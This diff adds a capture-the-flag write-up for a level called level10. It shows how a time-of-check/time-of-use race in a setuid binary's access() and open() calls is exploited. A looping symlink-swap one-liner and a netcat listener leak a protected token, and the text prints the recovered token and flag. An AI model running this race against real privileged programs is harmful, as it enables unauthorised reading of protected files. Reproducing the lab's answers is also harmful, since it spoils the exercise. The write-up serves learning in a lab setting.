@@ -1,0 +1,72 @@
+Upon arrival, we get a binary `level10` and a file "token".
+The binary is used to send a file to a host. With `strings level10`, we get lines such as :
+"socket
+[...]
+connect
+[...]
+read
+[...]
+open
+access
+[...]
+Connecting to %s:6969 .." etc.
+
+We can deduce the binary creates a socket and listens for connections on port 6969 on the vm (localhost / 127.0.0.1).
+We can listen for connections with the netcat command, like so : `nc -k -l 6969 > /tmp/log_socket` (`-k` to force netcat to stay listening for other connections after the current one is completed, `-l` to listen for connections instead of initiating a connection to a remote host, `> /tmp/log_socket` to output the connections' return inside a file we can read).
+
+Now that we have access, we can test this connection by opening another shell and try sending files using the binary :
+`echo 'hello' > /tmp/hello && ./level10 /tmp/hello 127.0.0.1`
+
+Output :
+"Connecting to 127.0.0.1:6969 .. Connected!
+Sending file .. wrote file!"
+
+Let's look with `cat /tmp/log_socket` :
+".*( )*.
+hello"
+
+If we try with the token file, it says we can't access it.
+We can try to use the symbolic link exploit from level08, but it won't grant us access either.
+
+Going back to `strings level10`, or even using `gdb`, we can see the binary uses the `access()` function.
+`access(const char *pathname, int mode)` checks whether we can access the file (`pathname`) / the user's permissions on a file. If `pathname` is a symbolic link, it is dereferenced.
+In the man, we can read some very interesting things : "Using access() to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates a security hole, because the user might exploit the short time interval between checking and opening the file to manipulate it. For this reason, the use of this system call should be avoided."
+This is the exploit. We have to exploit the time lapse between checking permissions and opening the file to get access to token.
+
+We'll fool the program by doing two things :
+1) Symlinking continuously a file on which we have rights to a second one on which we have rights too, then symlinking the second file to the token file.
+2) Spamming the binary to exploit the time lapse in which we have rights to trick `access()` into thinking we have rights on the symlink to "token"
+The two asynchronously, so when the symlink spamming gets to link file2 to token, we still have rights when spamming the binary.
+
+We can do so by creating two infinite loops and making them work asynchronously.
+First, create a first file on which we have rights : `touch /tmp/hello`
+Then, launch the two loops asynchronously (the first one will run in the background, forcefully symlinking the files continuously) :
+`(while true; do ln -sf /tmp/hello /tmp/feedback && ln -sf $(pwd)/token /tmp/feedback; done) & while true; do ./level10 /tmp/feedback 127.0.0.1 && echo 'haha'; done;`
+
+(`while true; do [task]; done` to launch task infinitely,
+`ln -sf` to symlink, with f to force so we don't get "file exists" errors,
+`&` to run tasks asynchronously, first one in the background)
+
+Break the loop, then look inside the log : `cat /tmp/log_socket`
+In between lines from the "/tmp/hello" file, you should get the flag.
+Output :
+".*( )*.
+hello
+.*( )*.
+hello
+.*( )*.
+hello
+.*( )*.
+woupa2yuojeeaaed06riuj63c
+.*( )*.
+hello
+.*( )*.
+hello
+.*( )*.
+hello"
+
+With the hash, log as flag10 and get the flag :
+`su flag10` (use hash),
+`getflag` => "Check flag.Here is your token : feulo4b72j7edeahuete3no7c"
+
+See : man 2 access
